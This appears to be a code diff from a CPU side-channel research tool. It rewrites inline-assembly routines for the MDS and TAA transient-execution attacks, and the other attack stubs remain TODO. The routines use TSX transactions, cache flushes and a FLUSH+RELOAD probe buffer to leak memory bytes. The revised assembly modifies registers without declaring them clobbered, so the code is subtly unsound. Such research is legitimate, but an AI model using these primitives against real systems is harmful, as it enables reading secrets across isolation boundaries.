@@ -9,13 +9,13 @@
 /**
  * @brief Try different variants of the l1des attack.
  * 
- * @param l1des_attack the specified attack
+ * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
  *
  * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
  */
-static void l1des_attack(enclyser_attack_t *l1des_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+static void l1des_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
     /** TODO */
 }
@@ -23,13 +23,13 @@ static void l1des_attack(enclyser_attack_t *l1des_attack, enclyser_buffer_t *att
 /**
  * @brief Try different variants of the l1tf attack.
  * 
- * @param l1tf_attack the specified attack
+ * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
  *
  * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
  */
-static void l1tf_attack(enclyser_attack_t *l1tf_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+static void l1tf_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
     /** TODO */
 }
@@ -37,13 +37,13 @@ static void l1tf_attack(enclyser_attack_t *l1tf_attack, enclyser_buffer_t *attak
 /**
  * @brief Try different variants of the lvi attack.
  * 
- * @param lvi_attack the specified attack
+ * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
  *
  * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
  */
-static void lvi_attack(enclyser_attack_t *lvi_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+static void lvi_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
     /** TODO */
 }
@@ -51,32 +51,43 @@ static void lvi_attack(enclyser_attack_t *lvi_attack, enclyser_buffer_t *attakin
 /**
  * @brief Try different variants of the mds attack.
  * 
- * @param mds_attack the specified attack
+ * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
  *
  * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
  */
-static void mds_attack(enclyser_attack_t *mds_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    switch (mds_attack->minor)
+    uint64_t rdi, rsi, rdx, rcx, r8;
+
+    ASSERT((0 < attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
+
+    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
+    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
+    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+
+    switch (attack_spec->minor)
     {
     case ATTACK_MINOR_NONE:
         break;
     case ATTACK_MINOR_STABLE:
         asm volatile(
+            "movq %4, %%r8\n"
+            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
             "mfence\n"
-            "clflush (%2)\n"    /** TODO seperate the two parts */
-            "xbegin 1f\n" 
-            "movzbq 0(%0), %%rax\n"
-            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
-            "movzbq (%%rax, %1), %%rax\n"
-            "xabort $0\n"
+            "clflush (%%r8)\n"
+            "xbegin 1f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
             "xend\n"
             "1:\n"
             :
-            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
-            : "rax");
+            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
+            :);
         break;
     default:
         break;
@@ -86,34 +97,45 @@ static void mds_attack(enclyser_attack_t *mds_attack, enclyser_buffer_t *attakin
 /**
  * @brief Try different variants of the taa attack.
  * 
- * @param taa_attack the specified attack
+ * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
  *
  * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
  */
-static void taa_attack(enclyser_attack_t *taa_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+static void taa_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    switch (taa_attack->minor)
+    uint64_t rdi, rsi, rdx, rcx, r8;
+
+    ASSERT((0 < attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
+
+    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
+    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
+    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+
+    switch (attack_spec->minor)
     {
     case ATTACK_MINOR_NONE:
         break;
     case ATTACK_MINOR_STABLE:
         asm volatile(
+            "movq %4, %%r8\n"
+            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
             "mfence\n"
-            "clflush (%2)\n"
+            "clflush (%%r8)\n"
             "sfence\n"
-            "clflush (%1)\n"    /** TODO seperate the two parts */
-            "xbegin 1f\n" 
-            "movzbq 0(%0), %%rax\n"
-            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
-            "movzbq (%%rax, %1), %%rax\n"
-            "xabort $0\n"
+            "clflush (%%rdx)\n"
+            "xbegin 1f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
             "xend\n"
             "1:\n"
             :
-            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
-            : "rax");
+            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
+            :);
         break;
     default:
         break;
